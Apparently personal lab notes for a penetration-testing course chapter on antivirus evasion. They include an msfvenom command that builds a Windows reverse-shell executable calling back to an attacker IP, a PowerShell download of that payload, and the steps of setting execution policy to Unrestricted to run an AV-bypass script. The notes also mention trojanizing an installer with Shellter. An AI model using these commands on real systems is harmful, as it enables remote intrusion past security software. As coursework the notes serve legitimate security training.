14.1.3. Detection Methods

*Lab Exercise*
3. Sharing file using RDP 
```
Hint
1) Download malware.exe using the drive capabilities provided by either xfreerdp or rdesktop.
2) Once the file is uploaded, you should find more occurrences of the flag by looking at Behavior > Process and service actions.


┌──(kali㉿kali)-[~/OSCP/14]
└─$ rdesktop -u offsec -p lab -g 85% -r disk:tmp=/tmp 192.168.244.61
 # Tmp folder from kali is shared to windows which can be access in \\tscleint\tmp

> Copy malware file to shared folder. File shared from there. 

```

#### 14.2. Bypassing Antivirus Detections
14.2.1. On-Disk Evasion
14.2.2. In-Memory Evasion
#### 14.3. AV Evasion in Practice
14.3.1. Testing for AV Evasion
14.3.2. Evading AV with Thread Injection
1. Start the machine and connect it with Rdp
```
rdesktop 192.168.207.62 -u offsec -p lab -g 50%+150+100
```
2. Create a malicious file named binary.exe using msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.195 LPORT=443 -f exe > binary.exe
```
3. Tried to upload it to windows machine, first start apache in kali and try to download in windows. Blocked by avira anti-virus. 
```

4. Design a script from trial and error method for skipping antivirus detection named bypass.ps1
```
![[Pasted image 20240131083231.png]]
```

5. Attempting to run the script and encountering the Execution Policies error
```
PS C:\Users\offsec\Desktop> .\bypass.ps1
.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because running scripts is disabled on this
system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.

6. Changing the ExecutionPolicy for our current user
```
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined

PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help Module at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```

7. Run and obtained reverse shell. 
```
PS C:\Users\offsec\Desktop> .\bypass.ps1

14.3.3. Automating the Process
Follow the walkthrough, it may take time to install shellter. The point here is creating a paylaod kind file with spotifyinsteller using shellter and sharing it to the windows mahcine using apache server running here at kali. You can download in windows using this command. 
```
C:\Users\offsec>powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.195/binary.exe','binary.exe')
```
